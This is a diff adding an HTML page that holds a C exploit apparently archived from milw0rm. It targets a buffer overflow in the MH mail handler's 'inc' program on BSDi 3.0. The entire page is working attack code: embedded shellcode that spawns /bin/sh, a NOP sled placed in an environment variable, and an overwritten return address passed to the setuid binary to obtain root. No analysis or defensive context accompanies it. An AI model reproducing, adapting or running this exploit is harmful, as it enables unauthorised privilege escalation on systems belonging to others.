@@ -1,0 +1,46 @@
+<html>
+<head>
+<title>BSDi 3.0 inc Local Root Buffer Overflow Exploit</title>
+<pre>
+/*
+   (BSDi)inc[mh] buffer overflow, by v9[v9@fakehalo.org].
+   this is will give you euid=0(root) on BSDi/3.0 systems.
+*/
+
+#define PATH		&quot;/usr/contrib/mh/bin/inc&quot;  /* path to inc on BSDi/3.0 */
+#define BUFFER		2048                       /* no need to change this. */
+#define DEFAULT_OFFSET	-7000                      /* generalized offset.     */
+
+static char exec[]=
+ &quot;\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c&quot; /* 14 characters. */
+ &quot;\x89\x76\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff&quot; /* 14 characters. */
+ &quot;\xff\xff\xff\x07\xff\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e&quot; /* 14 characters. */
+ &quot;\x2f\x73\x68\x00&quot;;                    /* 4 characters; 46 characters total. */
+
+long pointer(void){__asm__(&quot;movl %esp,%eax&quot;);}
+int main(int argc,char **argv){
+  char eip[BUFFER],buf[4096];
+  int i,offset;
+  long ret;
+  printf(&quot;[ (BSDi)inc[mh]: buffer overflow, by: v9[v9@fakehalo.org]. ]\n&quot;);
+  if(argc&gt;1){offset=atoi(argv[1]);}
+  else{offset=DEFAULT_OFFSET;}
+  ret=(pointer()-offset);
+  eip[0]=0x01;eip[1]=0x01;eip[2]=0x01;
+  for(i=3;i&lt;BUFFER;i+=4){*(long *)&amp;eip[i]=ret;}
+  eip[BUFFER]=0x0;
+  for(i=0;i&lt;(4096-strlen(exec)-strlen(eip));i++){*(buf+i)=0x90;}
+  memcpy(buf+i,exec,strlen(exec));
+  memcpy(buf,&quot;EXEC=&quot;,5);putenv(buf);
+  printf(&quot;*** [data]: return address: 0x%lx, offset: %d.\n&quot;,ret,offset);
+  if(execlp(PATH,&quot;inc&quot;,&quot;-file&quot;,eip,0)){
+    printf(&quot;*** [error]: could not execute %s successfully.\n&quot;,PATH);
+    exit(1);
+  }
+}
+
+
+// milw0rm.com [2000-11-30]
+</pre>
+</html>
+
